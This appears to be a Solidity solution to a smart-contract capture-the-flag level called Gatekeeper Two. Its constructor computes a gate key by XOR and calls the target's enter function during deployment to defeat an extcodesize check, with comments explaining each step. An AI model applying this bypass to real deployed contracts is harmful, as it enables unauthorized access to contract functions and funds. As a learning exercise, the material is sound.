// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwoAttack {

    constructor (address _addr) public {
        // If we know that a ^ b = c and a ^ c = b, we can get the key of gate three.
        // require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1); 

        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);

        /*-------------------------------------*/

        // With the adquired key, we call the enter function via signature, passing the key.

        _addr.call(abi.encodeWithSignature("enter(bytes8)", _gateKey));

        // We can pass the requirement of gate two thanks to the calling of the function inside of the constructor
        // because when the contract is being deployed, the code cannot be accessed until it is comletely deployed.
        // This way, when ----> assembly {x := extcodesize(caller())} and ----> require(x == 0)
        // The code of this contract will meet the requirement of being zero.
    }

}   